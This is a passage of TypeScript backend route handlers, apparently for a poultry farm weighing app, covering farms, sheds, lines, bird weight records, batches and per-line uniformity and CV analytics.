        // B0. PARTS ENDPOINTS (POST /api/parts, PUT /api/parts/:id, DELETE /api/parts/:id)
        // -------------------------------------------------------------
        if ((path === '/parts' || path === '/parts/') && method === 'POST') {
          const body = await request.json().catch(() => ({})) as any;
          const shedId = body.shedId || body.shed_id;
          const name = (body.name || 'Part A').trim();
          if (!shedId) return errorResponse('Missing shedId', 400);

          const partId = `part-${Date.now()}-${Math.random().toString(36).substring(2, 7)}`;
          if (env.DB) {
            await env.DB.prepare(
              'INSERT INTO parts (id, shed_id, name) VALUES (?, ?, ?)'
            ).bind(partId, shedId, name).run().catch((err) => {
              console.error('Error adding part:', err);
            });
          }

          return jsonResponse({ id: partId, shedId, name, lines: [] }, 201);
        }

        const singlePartMatch = path.match(/^\/parts\/([^/]+)$/);
        if (singlePartMatch && method === 'PUT') {
          const partId = decodeURIComponent(singlePartMatch[1]);
          const body = await request.json().catch(() => ({})) as any;
          const name = (body.name || '').trim();
          if (env.DB && name) {
            await env.DB.prepare('UPDATE parts SET name = ? WHERE id = ?').bind(name, partId).run().catch(() => {});
          }
          return jsonResponse({ success: true, message: 'Part updated' });
        }

        if (singlePartMatch && method === 'DELETE') {
          const partId = decodeURIComponent(singlePartMatch[1]);
          if (env.DB) {
            await env.DB.prepare('DELETE FROM bird_weights WHERE line_id IN (SELECT id FROM lines WHERE part_id = ?)').bind(partId).run().catch(() => {});
            await env.DB.prepare('DELETE FROM lines WHERE part_id = ?').bind(partId).run().catch(() => {});
            await env.DB.prepare('DELETE FROM parts WHERE id = ?').bind(partId).run().catch(() => {});
          }
          return jsonResponse({ success: true, message: 'Part deleted' });
        }

        // -------------------------------------------------------------
        // B1. LINES ENDPOINTS (POST /api/lines, PUT /api/lines/:id, DELETE /api/lines/:id)
        // -------------------------------------------------------------
        if ((path === '/lines' || path === '/lines/') && method === 'POST') {
          const body = await request.json().catch(() => ({})) as any;
          const partId = body.partId || body.part_id;
          if (!partId) return errorResponse('Missing partId', 400);

          let lineNum = body.lineNumber;
          if (!lineNum && env.DB) {
            const countRes = await env.DB.prepare('SELECT COUNT(*) as count FROM lines WHERE part_id = ?').bind(partId).first() as any;
            lineNum = (countRes?.count || 0) + 1;
          } else if (!lineNum) {
            lineNum = 1;
          }

          const lineName = body.name || `Line ${lineNum}`;
          const gender = (body.gender || 'MALE').toUpperCase() === 'FEMALE' ? 'FEMALE' : 'MALE';
          const lineId = `line-${Date.now()}-${Math.random().toString(36).substring(2, 7)}`;

          if (env.DB) {
            await env.DB.prepare(`
              INSERT INTO lines (id, part_id, line_number, name, gender, std_weight_grams, target_bird_count)
              VALUES (?, ?, ?, ?, ?, 140, 50)
            `).bind(lineId, partId, lineNum, lineName, gender).run().catch((err) => {
              console.error('Error adding line:', err);
            });
          }

          return jsonResponse({ id: lineId, partId, lineNumber: lineNum, name: lineName, gender, weights: [] }, 201);
        }

        const singleLineMatch = path.match(/^\/lines\/([^/]+)$/);
        if (singleLineMatch && method === 'PUT') {
          const lineId = decodeURIComponent(singleLineMatch[1]);
          const body = await request.json().catch(() => ({})) as any;
          if (env.DB) {
            if (body.name) {
              await env.DB.prepare('UPDATE lines SET name = ? WHERE id = ?').bind(body.name, lineId).run().catch(() => {});
            }
            if (body.gender) {
              const g = body.gender.toUpperCase() === 'FEMALE' ? 'FEMALE' : 'MALE';
              await env.DB.prepare('UPDATE lines SET gender = ? WHERE id = ?').bind(g, lineId).run().catch(() => {});
            }
          }
          return jsonResponse({ success: true, message: 'Line updated' });
        }

        if (singleLineMatch && method === 'DELETE') {
          const lineId = decodeURIComponent(singleLineMatch[1]);
          if (env.DB) {
            const line = await env.DB.prepare('SELECT part_id FROM lines WHERE id = ?').bind(lineId).first() as any;
            await env.DB.prepare('DELETE FROM bird_weights WHERE line_id = ?').bind(lineId).run().catch(() => {});
            await env.DB.prepare('DELETE FROM lines WHERE id = ?').bind(lineId).run().catch(() => {});

            // Auto-reindex remaining lines in that part sequentially from Line 1
            if (line?.part_id) {
              const remRes = await env.DB.prepare('SELECT id FROM lines WHERE part_id = ? ORDER BY line_number ASC, rowid ASC').bind(line.part_id).all().catch(() => ({ results: [] }));
              const remLines = (remRes.results || []) as any[];
              for (let i = 0; i < remLines.length; i++) {
                const nextNum = i + 1;
                await env.DB.prepare('UPDATE lines SET line_number = ?, name = ? WHERE id = ?').bind(nextNum, `Line ${nextNum}`, remLines[i].id).run().catch(() => {});
              }
            }
          }
          return jsonResponse({ success: true, message: 'Line deleted' });
        }

        // -------------------------------------------------------------
        // B. LINE GENDER ENDPOINT: PATCH /api/lines/:id/gender
        // -------------------------------------------------------------
        const lineGenderMatch = path.match(/^\/lines\/([^/]+)\/gender$/);
        if (lineGenderMatch && method === 'PATCH') {
          const lineId = decodeURIComponent(lineGenderMatch[1]);
          const body = await request.json().catch(() => ({})) as any;
          const gender = (body.gender || '').toUpperCase();

          if (gender !== 'MALE' && gender !== 'FEMALE') {
            return errorResponse('Invalid gender. Must be MALE or FEMALE', 400);
          }

          if (!env.DB) {
            return jsonResponse({ success: true, lineId, gender, note: 'Simulated D1 mode' });
          }

          // Fetch flock age/week to look up new STD
          const lineInfo = await env.DB.prepare(`
            SELECT l.id, l.name, l.part_id, f.flock_age_days, f.age_week
            FROM lines l
            JOIN parts p ON l.part_id = p.id
            JOIN sheds s ON p.shed_id = s.id
            JOIN farms f ON s.farm_id = f.id
            WHERE l.id = ?
          `).bind(lineId).first() as any;

          let stdWeight = gender === 'MALE' ? 150 : 140;
          if (lineInfo) {
            const weekNum = parseInt(String(lineInfo.age_week || 'W1').replace(/\D/g, '') || '1', 10);
            const stdLookup = await env.DB.prepare(
              'SELECT std_weight_grams FROM standard_weights WHERE age_week = ? AND gender = ?'
            ).bind(weekNum, gender).first() as any;
            if (stdLookup && stdLookup.std_weight_grams) {
              stdWeight = stdLookup.std_weight_grams;
            }
          }

          await env.DB.prepare(
            'UPDATE lines SET gender = ?, std_weight_grams = ? WHERE id = ?'
          ).bind(gender, stdWeight, lineId).run();

          return jsonResponse({
            success: true,
            lineId,
            gender,
            stdWeightGrams: stdWeight,
            message: `Line gender updated to ${gender} with STD ${stdWeight}g`,
          });
        }

        // -------------------------------------------------------------
        // C. WEIGHTS ENDPOINTS: POST /api/weights, DELETE /api/weights
        // -------------------------------------------------------------
        if (path === '/weights' || path === '/weights/') {
          if (method === 'POST') {
            const body = await request.json().catch(() => ({})) as any;
            const { lineId, weight, entryIndex, recordedBy, week } = body;

            if (!lineId || weight === undefined || weight === null) {
              return errorResponse('Missing required fields: lineId and weight', 400);
            }

            const weightGrams = Number(weight);
            if (isNaN(weightGrams) || weightGrams <= 0) {
              return errorResponse('Weight must be a positive number', 400);
            }

            if (!env.DB) {
              return jsonResponse({ success: true, id: `w-${Date.now()}`, weightGrams });
            }

            // Get current line STD
            const line = await env.DB.prepare('SELECT std_weight_grams, gender FROM lines WHERE id = ?').bind(lineId).first() as any;
            const stdWeightAtEntry = line?.std_weight_grams || 140;

            const countRes = await env.DB.prepare('SELECT COUNT(*) as count FROM bird_weights WHERE line_id = ?').bind(lineId).first() as any;
            const finalIndex = entryIndex !== undefined ? entryIndex : (countRes?.count || 0) + 1;
            const weightId = `w-${Date.now()}-${Math.random().toString(36).substring(2, 7)}`;

            await env.DB.prepare(
              'INSERT INTO bird_weights (id, line_id, entry_index, weight_grams, std_weight_at_entry, recorded_by, week) VALUES (?, ?, ?, ?, ?, ?, ?)'
            ).bind(weightId, lineId, finalIndex, weightGrams, stdWeightAtEntry, recordedBy || 'Operator', week || 'W1').run();

            return jsonResponse({
              success: true,
              id: weightId,
              lineId,
              entryIndex: finalIndex,
              weightGrams,
              stdWeightAtEntry,
            });
          }

          if (method === 'DELETE') {
            const body = await request.json().catch(() => ({})) as any;
            const { id, lineId, index, clearAll } = body;

            if (!env.DB) return jsonResponse({ success: true });

            if (clearAll && lineId) {
              await env.DB.prepare('DELETE FROM bird_weights WHERE line_id = ?').bind(lineId).run();
              return jsonResponse({ success: true, message: `Cleared all weights in line ${lineId}` });
            }

            if (id) {
              await env.DB.prepare('DELETE FROM bird_weights WHERE id = ?').bind(id).run();
              return jsonResponse({ success: true, message: `Deleted weight ${id}` });
            }

            if (lineId && index !== undefined) {
              // Delete by line and order index
              const target = await env.DB.prepare(
                'SELECT id FROM bird_weights WHERE line_id = ? ORDER BY entry_index ASC LIMIT 1 OFFSET ?'
              ).bind(lineId, index).first() as any;

              if (target?.id) {
                await env.DB.prepare('DELETE FROM bird_weights WHERE id = ?').bind(target.id).run();
              }
              return jsonResponse({ success: true, message: `Deleted weight at index ${index}` });
            }

            return errorResponse('Specify weight id, clearAll, or lineId and index', 400);
          }
        }

        // Sub-routes for weights on lines:
        // POST /api/lines/:id/weight
        // DELETE /api/lines/:id/weight/:index
        // POST /api/lines/:id/clear
        const lineWeightMatch = path.match(/^\/lines\/([^/]+)\/weight$/);
        if (lineWeightMatch && method === 'POST') {
          const lineId = decodeURIComponent(lineWeightMatch[1]);
          const body = await request.json().catch(() => ({})) as any;
          const weightGrams = Number(body.weight);

          if (!env.DB) return jsonResponse({ success: true, weight: weightGrams });

          const line = await env.DB.prepare('SELECT std_weight_grams FROM lines WHERE id = ?').bind(lineId).first() as any;
          const stdWeightAtEntry = line?.std_weight_grams || 140;
          const countRes = await env.DB.prepare('SELECT COUNT(*) as count FROM bird_weights WHERE line_id = ?').bind(lineId).first() as any;
          const nextIndex = (countRes?.count || 0) + 1;
          const weightId = `w-${Date.now()}-${Math.random().toString(36).substring(2, 7)}`;

          await env.DB.prepare(
            'INSERT INTO bird_weights (id, line_id, entry_index, weight_grams, std_weight_at_entry, recorded_by, week) VALUES (?, ?, ?, ?, ?, ?, ?)'
          ).bind(weightId, lineId, nextIndex, weightGrams, stdWeightAtEntry, body.userName || 'Operator', body.week || 'W1').run();

          return jsonResponse({ success: true, id: weightId, weight: weightGrams });
        }

        const lineDeleteWeightMatch = path.match(/^\/lines\/([^/]+)\/weight\/(\d+)$/);
        if (lineDeleteWeightMatch && method === 'DELETE') {
          const lineId = decodeURIComponent(lineDeleteWeightMatch[1]);
          const index = parseInt(lineDeleteWeightMatch[2], 10);

          if (!env.DB) return jsonResponse({ success: true });

          const target = await env.DB.prepare(
            'SELECT id FROM bird_weights WHERE line_id = ? ORDER BY entry_index ASC LIMIT 1 OFFSET ?'
          ).bind(lineId, index).first() as any;

          if (target?.id) {
            await env.DB.prepare('DELETE FROM bird_weights WHERE id = ?').bind(target.id).run();
          }

          return jsonResponse({ success: true });
        }

        const lineClearMatch = path.match(/^\/lines\/([^/]+)\/clear$/);
        if (lineClearMatch && method === 'POST') {
          const lineId = decodeURIComponent(lineClearMatch[1]);
          if (env.DB) {
            await env.DB.prepare('DELETE FROM bird_weights WHERE line_id = ?').bind(lineId).run();
          }
          return jsonResponse({ success: true, message: `Weights cleared for line ${lineId}` });
        }

        // -------------------------------------------------------------
        // D. ADMIN ANALYTICS ENDPOINT: GET /api/admin/analytics
        // Computes AVG WT, STD, Uniformity %, CV % dynamically per Line Gender
        // -------------------------------------------------------------
        if ((path === '/admin/analytics' || path === '/admin/analytics/') && method === 'GET') {
          const farmId = url.searchParams.get('farmId');
          if (!env.DB) {
            return jsonResponse({
              analytics: {
                totalBirds: 0,
                femaleAvg: 0,
                maleAvg: 0,
                femaleUniformity: 0,
                maleUniformity: 0,
                linesBreakdown: [],
              },
            });
          }

          const linesQuery = farmId
            ? await env.DB.prepare(`
                SELECT l.id, l.name as line_name, l.gender, l.std_weight_grams,
                       s.id as shed_id, s.name as shed_name,
                       p.id as part_id, p.name as part_name
                FROM lines l
                JOIN parts p ON l.part_id = p.id
                JOIN sheds s ON p.shed_id = s.id
                WHERE s.farm_id = ?
                ORDER BY s.name, p.name, l.line_number
              `).bind(farmId).all()
            : await env.DB.prepare(`
                SELECT l.id, l.name as line_name, l.gender, l.std_weight_grams,
                       s.id as shed_id, s.name as shed_name,
                       p.id as part_id, p.name as part_name
                FROM lines l
                JOIN parts p ON l.part_id = p.id
                JOIN sheds s ON p.shed_id = s.id
                ORDER BY s.name, p.name, l.line_number
              `).all();

          const allLines = linesQuery.results || [];
          const linesBreakdown: any[] = [];

          let allFemaleWeights: number[] = [];
          let allMaleWeights: number[] = [];

          for (const l of allLines) {
            const weightsRes = await env.DB.prepare(
              'SELECT weight_grams FROM bird_weights WHERE line_id = ?'
            ).bind(l.id).all();
            const weights = (weightsRes.results || []).map((w: any) => Number(w.weight_grams));

            const count = weights.length;
            const sum = weights.reduce((a: number, b: number) => a + b, 0);
            const avg = count > 0 ? Math.round((sum / count) * 10) / 10 : 0;
            const std = l.std_weight_grams || (l.gender === 'MALE' ? 150 : 140);

            // Uniformity: percentage within std ± 10%
            const lowerBand = std * 0.9;
            const upperBand = std * 1.1;
            const inRangeCount = count > 0 ? weights.filter((w: number) => w >= lowerBand && w <= upperBand).length : 0;
            const uniformityPct = count > 0 ? Math.round((inRangeCount / count) * 1000) / 10 : 0;

            // CV% (Coefficient of variation: Standard Deviation / Mean * 100)
            let cv = 0;
            if (count > 1 && avg > 0) {
              const variance = weights.reduce((acc: number, val: number) => acc + Math.pow(val - avg, 2), 0) / (count - 1);
              const stdDev = Math.sqrt(variance);
              cv = Math.round((stdDev / avg) * 10000) / 100;
            }

            if (l.gender === 'FEMALE') {
              allFemaleWeights.push(...weights);
            } else {
              allMaleWeights.push(...weights);
            }

            linesBreakdown.push({
              lineId: l.id,
              lineName: l.line_name,
              shedName: l.shed_name,
              partName: l.part_name,
              gender: l.gender,
              stdWeight: std,
              birdCount: count,
              averageWeight: avg,
              uniformityPercent: uniformityPct,
              cvPercent: cv,
            });
          }

          const calcGroupStats = (weightsList: number[]) => {
            const count = weightsList.length;
            if (count === 0) return { count: 0, avg: 0, uniformity: 0 };
            const avg = Math.round((weightsList.reduce((a, b) => a + b, 0) / count) * 10) / 10;
            const inRange = weightsList.filter(w => w >= avg * 0.9 && w <= avg * 1.1).length;
            return {
              count,
              avg,
              uniformity: Math.round((inRange / count) * 1000) / 10,
            };
          };

          return jsonResponse({
            success: true,
            analytics: {
              totalBirds: allFemaleWeights.length + allMaleWeights.length,
              female: calcGroupStats(allFemaleWeights),
              male: calcGroupStats(allMaleWeights),
              linesBreakdown,
            },
          });
        }

        // -------------------------------------------------------------
        // E. FARMS REST ENDPOINTS: GET /api/farms, POST /api/farms
        // -------------------------------------------------------------
        if (path === '/farms' || path === '/farms/') {
          if (method === 'GET') {
            if (!env.DB) {
              return jsonResponse([]);
            }
            await ensureBatchesTable(env);
            const includeArchived = url.searchParams.get('includeArchived') === 'true';
            const farmsRes = includeArchived
              ? await env.DB.prepare('SELECT * FROM farms ORDER BY created_at DESC').all()
              : await env.DB.prepare('SELECT * FROM farms WHERE is_archived = 0 ORDER BY created_at DESC').all();

            const farms = farmsRes.results || [];
            const summaries: any[] = [];

            const allUsersRes = await env.DB.prepare('SELECT id, name, role, assigned_farms, assigned_farm_id FROM users').all().catch(() => ({ results: [] }));
            const allUsers = (allUsersRes.results || []) as any[];

            for (const f of farms) {
              const activeBatch = await ensureFarmActiveBatch(env, f);
              const shedCountRes = await env.DB.prepare('SELECT COUNT(*) as count FROM sheds WHERE farm_id = ?').bind(f.id).first() as any;
              const subCountRes = await env.DB.prepare('SELECT COUNT(*) as count FROM submissions WHERE farm_id = ?').bind(f.id).first() as any;

              const assignedUsers = allUsers.filter(u => {
                if (u.assigned_farm_id === f.id) return true;
                try {
                  const list = JSON.parse(u.assigned_farms || '[]');
                  return Array.isArray(list) && (list.includes(f.id) || list.includes(f.name));
                } catch {
                  return false;
                }
              });
              const assignedUserNames = assignedUsers.map(u => {
                const r = (u.role || '').toUpperCase();
                const display = (r === 'ADMIN' || r === 'MANAGER') ? 'Manager' : (r === 'INCHARGE' ? 'In-Charge' : 'Supervisor');
                return `${u.name} (${display})`;
              });

              summaries.push({
                id: f.id,
                name: f.name,
                location: f.location,
                flockDate: activeBatch?.startDate || f.flock_date || f.created_at,
                ageWeek: f.age_week || 'W1',
                season: f.season || 'Summer',
                updatedAt: f.updated_at || f.created_at,
                isArchived: Boolean(f.is_archived),
                activeBatch,
                startDate: activeBatch?.startDate || f.flock_date,
                startWeekNumber: activeBatch?.startWeekNumber || 1,
                assignedUserNames,
                _count: {
                  sheds: shedCountRes?.count || 0,
                  submissions: subCountRes?.count || 0,
                },
              });
            }

            return jsonResponse(summaries);
          }

          if (method === 'POST') {
            const body = await request.json().catch(() => ({})) as any;
            const farmId = `farm-${Date.now()}`;
            const farmName = (body.name || 'New Farm').trim();
            const season = body.season || 'Summer';
            const ageWeek = body.ageWeek || 'W1';
            const flockDate = body.flockDate || new Date().toISOString().split('T')[0];
            const shedCount = Math.min(Math.max(Number(body.shedCount) || 10, 1), 40);

            const createdSheds: any[] = [];
            const startWeekNum = parseInt(String(ageWeek || 'W1').replace(/\D/g, '') || '1', 10);
            const batchId = `batch-${farmId}-1`;

            if (env.DB) {
              await ensureBatchesTable(env);
              await env.DB.prepare(
                'INSERT INTO farms (id, name, season, age_week, flock_date) VALUES (?, ?, ?, ?, ?)'
              ).bind(farmId, farmName, season, ageWeek, flockDate).run();

              // Automatically initialize default Batch 1 for the new farm
              await env.DB.prepare(`
                INSERT INTO batches (id, farm_id, batch_name, start_date, start_week_number, status)
                VALUES (?, ?, 'Batch 1', ?, ?, 'ACTIVE')
              `).bind(batchId, farmId, flockDate, startWeekNum).run().catch(() => {});
            }

            // Pre-create sheds, parts, and lines with Line-level Gender and empty weights
            for (let sIdx = 1; sIdx <= shedCount; sIdx++) {
              const shedId = `shed-${farmId}-${sIdx}`;
              const shedName = `Shed ${sIdx}`;
              if (env.DB) {
                await env.DB.prepare(
                  'INSERT INTO sheds (id, farm_id, name) VALUES (?, ?, ?)'
                ).bind(shedId, farmId, shedName).run().catch(() => {});
              }

              const partsList: any[] = [];
              // 2 Parts per shed
              for (let pIdx = 1; pIdx <= 2; pIdx++) {
                const partId = `part-${shedId}-${pIdx}`;
                const partName = pIdx === 1 ? 'Part 1' : 'Part 2';
                if (env.DB) {
                  await env.DB.prepare(
                    'INSERT INTO parts (id, shed_id, name) VALUES (?, ?, ?)'
                  ).bind(partId, shedId, partName).run().catch(() => {});
                }

                const linesList: any[] = [];
                // 5 Lines per part
                for (let lIdx = 1; lIdx <= 5; lIdx++) {
                  const lineId = `line-${partId}-${lIdx}`;
                  // Default to FEMALE for main grower lines, MALE for line 5
                  const gender = (sIdx === shedCount || lIdx === 5) ? 'MALE' : 'FEMALE';
                  const std = gender === 'MALE' ? 150 : 140;

                  if (env.DB) {
                    await env.DB.prepare(
                      'INSERT INTO lines (id, part_id, line_number, name, gender, std_weight_grams) VALUES (?, ?, ?, ?, ?, ?)'
                    ).bind(lineId, partId, lIdx, `Line ${lIdx}`, gender, std).run().catch(() => {});
                  }

                  linesList.push({
                    id: lineId,
                    name: `Line ${lIdx}`,
                    lineNumber: lIdx,
                    gender,
                    stdWeight: std,
                    targetBirdCount: 0,
                    weights: [],
                  });
                }

                partsList.push({
                  id: partId,
                  name: partName,
                  lines: linesList,
                });
              }

              createdSheds.push({
                id: shedId,
                farmId,
                name: shedName,
                type: sIdx === shedCount ? 'Male' : 'Female',
                targetBirdCount: 0,
                locked: false,
                lockedByUserId: null,
                lockedByUserName: null,
                lockedAt: null,
                lastHeartbeatAt: null,
                recordedByUserId: null,
                recordedByUserName: null,
                birdCount: 0,
                weights: [],
                status: 'PENDING',
                savedStatus: 'PENDING',
                totalBirdCount: 0,
                parts: partsList,
              });
            }

            return jsonResponse({
              id: farmId,
              name: farmName,
              season,
              ageWeek,
              flockDate,
              shedCount,
              sheds: createdSheds,
              activeBatch: {
                id: batchId,
                farmId,
                batchName: 'Batch 1',
                startDate: flockDate,
                startWeekNumber: startWeekNum,
                status: 'ACTIVE',
              },
            }, 201);
          }
        }

        // -------------------------------------------------------------
        // E2. BATCHES REST ENDPOINTS: GET & POST /api/farms/:id/batches
        // -------------------------------------------------------------
        const farmBatchesMatch = path.match(/^\/farms\/([^/]+)\/batches$/);
        if (farmBatchesMatch) {
          const farmId = decodeURIComponent(farmBatchesMatch[1]);
          if (method === 'GET') {
            if (!env.DB) return jsonResponse({ success: true, batches: [] });
            await ensureBatchesTable(env);
            const farm = await env.DB.prepare('SELECT * FROM farms WHERE id = ?').bind(farmId).first() as any;
            if (!farm) return errorResponse('Farm not found', 404);

            await ensureFarmActiveBatch(env, farm);
            const batchesRes = await env.DB.prepare(
              'SELECT * FROM batches WHERE farm_id = ? ORDER BY created_at DESC'
            ).bind(farmId).all();

            const batches = (batchesRes.results || []).map((b: any) => ({
              id: b.id,
              farmId: b.farm_id,
              batchName: b.batch_name,
              startDate: b.start_date,
              startWeekNumber: b.start_week_number,
              status: b.status,
              createdAt: b.created_at,
              updatedAt: b.updated_at,
            }));

            return jsonResponse({ success: true, batches });
          }

          if (method === 'POST') {
            if (!env.DB) return jsonResponse({ success: true, message: 'D1 not bound' });
            await ensureBatchesTable(env);
            const farm = await env.DB.prepare('SELECT * FROM farms WHERE id = ?').bind(farmId).first() as any;
            if (!farm) return errorResponse('Farm not found', 404);

            const body = await request.json().catch(() => ({})) as any;

            // 1. Mark existing batches as COMPLETED (read-only)
            await env.DB.prepare(
              'UPDATE batches SET status = ?, updated_at = CURRENT_TIMESTAMP WHERE farm_id = ?'
            ).bind('COMPLETED', farmId).run();

            // 2. Determine new batch name
            const countRes = await env.DB.prepare(
              'SELECT COUNT(*) as count FROM batches WHERE farm_id = ?'
            ).bind(farmId).first() as any;
            const count = (countRes?.count || 0) + 1;
            const batchName = (body.batchName || `Batch ${count}`).trim();
            const startDate = body.startDate || new Date().toISOString().split('T')[0];
            const startWeekNumber = Number(body.startWeekNumber) || 1;
            const batchId = `batch-${farmId}-${Date.now()}`;

            // 3. Create new ACTIVE batch
            await env.DB.prepare(`
              INSERT INTO batches (id, farm_id, batch_name, start_date, start_week_number, status)
              VALUES (?, ?, ?, ?, ?, 'ACTIVE')
            `).bind(batchId, farmId, batchName, startDate, startWeekNumber).run();

            // 4. Release any active locks so new batch starts fresh
            await env.DB.prepare(`
              UPDATE sheds SET
                locked_by_user_id = NULL,
                locked_by_user_name = NULL,
                locked_at = NULL,
                last_heartbeat_at = NULL
              WHERE farm_id = ?
            `).bind(farmId).run().catch(() => {});

            const newBatch = {
              id: batchId,
              farmId,
              batchName,
              startDate,
              startWeekNumber,
              status: 'ACTIVE',
            };

            return jsonResponse({
              success: true,
              batch: newBatch,
              message: `Started ${batchName} successfully for farm ${farm.name}.`,
            }, 201);
          }
        }

        // GET /api/farms/:id
        const singleFarmMatch = path.match(/^\/farms\/([^/]+)$/);
        if (singleFarmMatch) {
          const farmId = decodeURIComponent(singleFarmMatch[1]);
          if (method === 'GET') {
            if (!env.DB) {
              return jsonResponse({ id: farmId, name: 'Active Farm', sheds: [] });
            }

            await ensureShedWeekStatusTable(env);
            await ensureBatchesTable(env);

            const farm = await env.DB.prepare('SELECT * FROM farms WHERE id = ?').bind(farmId).first() as any;
            if (!farm) return errorResponse('Farm not found', 404);

            const activeBatch = await ensureFarmActiveBatch(env, farm);
            const requestedBatchId = url.searchParams.get('batchId');
            const targetBatchId = requestedBatchId || activeBatch?.id;

            // Fetch all batches for this farm
            const allBatchesRes = await env.DB.prepare(
              'SELECT * FROM batches WHERE farm_id = ? ORDER BY created_at DESC'
            ).bind(farmId).all().catch(() => ({ results: [] }));
            const batchesList = (allBatchesRes.results || []).map((b: any) => ({
              id: b.id,
              farmId: b.farm_id,
              batchName: b.batch_name,
              startDate: b.start_date,
              startWeekNumber: b.start_week_number,
              status: b.status,
            }));

            // Check if selected batch is the initial/first batch for legacy backward compatibility
            const firstBatch = batchesList.length > 0 ? batchesList[batchesList.length - 1] : null;
            const isInitialBatch = Boolean(firstBatch && firstBatch.id === targetBatchId);

            const targetWeek = (url.searchParams.get('week') || farm.age_week || 'W18').toUpperCase();

            // Check if submission exists for this specific week and batch
            const subForWeek = isInitialBatch
              ? await env.DB.prepare(
                  'SELECT * FROM submissions WHERE farm_id = ? AND UPPER(flock_age) = ? AND (batch_id = ? OR batch_id IS NULL) ORDER BY created_at DESC LIMIT 1'
                ).bind(farmId, targetWeek, targetBatchId).first() as any
              : await env.DB.prepare(
                  'SELECT * FROM submissions WHERE farm_id = ? AND UPPER(flock_age) = ? AND batch_id = ? ORDER BY created_at DESC LIMIT 1'
                ).bind(farmId, targetWeek, targetBatchId).first() as any;

            // Fetch shed saves for this week and batch from shed_week_status
            const shedWeekStatuses = isInitialBatch
              ? await env.DB.prepare(
                  'SELECT * FROM shed_week_status WHERE farm_id = ? AND UPPER(week) = ? AND (batch_id = ? OR batch_id IS NULL)'
                ).bind(farmId, targetWeek, targetBatchId).all().catch(() => ({ results: [] }))
              : await env.DB.prepare(
                  'SELECT * FROM shed_week_status WHERE farm_id = ? AND UPPER(week) = ? AND batch_id = ?'
                ).bind(farmId, targetWeek, targetBatchId).all().catch(() => ({ results: [] }));
            const swsMap = new Map((shedWeekStatuses.results || []).map((s: any) => [s.shed_id, s]));

            const shedsRes = await env.DB.prepare('SELECT * FROM sheds WHERE farm_id = ?').bind(farmId).all();
            const sheds: any[] = [];
            let totalFarmBirds = 0;
            let savedShedsCount = 0;

            for (const s of shedsRes.results || []) {
              const partsRes = await env.DB.prepare('SELECT * FROM parts WHERE shed_id = ?').bind(s.id).all();
              const parts: any[] = [];
              let shedBirdCount = 0;

              for (const p of partsRes.results || []) {
                const linesRes = await env.DB.prepare('SELECT * FROM lines WHERE part_id = ? ORDER BY line_number ASC').bind(p.id).all();
                const lines: any[] = [];

                for (const l of linesRes.results || []) {
                  // Strictly filter weights by line_id, targetWeek AND batch
                  const weightsRes = isInitialBatch
                    ? await env.DB.prepare(
                        'SELECT weight_grams FROM bird_weights WHERE line_id = ? AND UPPER(week) = ? AND (batch_id = ? OR batch_id IS NULL) ORDER BY entry_index ASC'
                      ).bind(l.id, targetWeek, targetBatchId).all()
                    : await env.DB.prepare(
                        'SELECT weight_grams FROM bird_weights WHERE line_id = ? AND UPPER(week) = ? AND batch_id = ? ORDER BY entry_index ASC'
                      ).bind(l.id, targetWeek, targetBatchId).all();

                  const weights = (weightsRes.results || []).map((w: any) => w.weight_grams);
                  shedBirdCount += weights.length;

                  lines.push({
                    id: l.id,
                    name: l.name,
                    gender: l.gender,
                    weights,
                  });
                }

                parts.push({
                  id: p.id,
                  name: p.name,
                  lines,
                });
              }

              totalFarmBirds += shedBirdCount;
              const sws: any = swsMap.get(s.id);
              const isSaved = sws?.status === 'SAVED';
              if (isSaved) savedShedsCount++;

              const last = s.last_heartbeat_at ? new Date(s.last_heartbeat_at).getTime() : 0;
              const isLocked = Boolean(s.locked_by_user_id && last && (Date.now() - last <= 120_000) && (!s.locked_week || s.locked_week.toUpperCase() === targetWeek.toUpperCase()));

              sheds.push({
                id: s.id,
                name: s.name,
                locked: isLocked,
                lockedByUserId: isLocked ? s.locked_by_user_id : null,
                lockedByUserName: isLocked ? s.locked_by_user_name : null,
                lockedAt: isLocked ? s.locked_at : null,
                lastHeartbeatAt: isLocked ? s.last_heartbeat_at : null,
                // Stage 2: Team Visibility attributes strictly scoped to targetWeek
                savedStatus: isSaved ? 'SAVED' : (shedBirdCount > 0 ? 'DRAFT' : 'PENDING'),
                savedByUserId: isSaved ? (sws?.saved_by_user_id || null) : null,
                savedByUserName: isSaved ? (sws?.saved_by_user_name || null) : null,
                totalBirdCount: isSaved ? (sws?.total_bird_count || 0) : shedBirdCount,
                savedAt: isSaved ? (sws?.saved_at || null) : null,
                parts,
              });
            }

            const totalShedsCount = sheds.length;
            const allShedsSaved = totalShedsCount > 0 && savedShedsCount >= totalShedsCount;
            const selectedBatch = batchesList.find(b => b.id === targetBatchId) || activeBatch;

            // Fetch assigned user names for this farm
            const farmUsersRes = await env.DB.prepare('SELECT id, name, role, assigned_farms, assigned_farm_id FROM users').all().catch(() => ({ results: [] }));
            const farmAssignedUsers = ((farmUsersRes.results || []) as any[]).filter(u => {
              if (u.assigned_farm_id === farmId) return true;
              try {
                const list = JSON.parse(u.assigned_farms || '[]');
                return Array.isArray(list) && (list.includes(farmId) || list.includes(farm.name));
              } catch {
                return false;
              }
            });
            const assignedUserNames = farmAssignedUsers.map(u => {
              const r = (u.role || '').toUpperCase();
              const display = (r === 'ADMIN' || r === 'MANAGER') ? 'Manager' : (r === 'INCHARGE' ? 'In-Charge' : 'Supervisor');
              return `${u.name} (${display})`;
            });

            return jsonResponse({
              ...farm,
              ageWeek: targetWeek,
              activeBatch,
              batches: batchesList,
              currentBatch: selectedBatch,
              startDate: selectedBatch?.startDate || farm.flock_date,
              startWeekNumber: selectedBatch?.startWeekNumber || 1,
              status: subForWeek ? 'COMPLETED' : 'DRAFT',
              assignedUserNames,
              audit: subForWeek ? {
                status: 'COMPLETED',
                lastSubmittedAt: subForWeek.created_at,
                lastSubmittedBy: subForWeek.submitted_by,
                lastSubmittedRole: subForWeek.submitted_role,
                submittedBy: subForWeek.submitted_by,
                submittedRole: subForWeek.submitted_role,
                totalBirdsSubmitted: subForWeek.total_birds,
                batchId: subForWeek.batch_id,
                batchName: subForWeek.batch_name,
              } : null,
              farmProgress: {
                totalShedsCount,
                savedShedsCount,
                totalFarmBirds,
                allShedsSaved,
                progressPercent: totalShedsCount > 0 ? Math.round((savedShedsCount / totalShedsCount) * 100) : 0,
              },
              allShedsSaved,
              sheds,
            });
          }

          if (method === 'DELETE') {
            if (env.DB) {
              await env.DB.prepare('UPDATE farms SET is_archived = 1 WHERE id = ?').bind(farmId).run();
            }
            return jsonResponse({ success: true, message: 'Farm archived' });
          }
        }

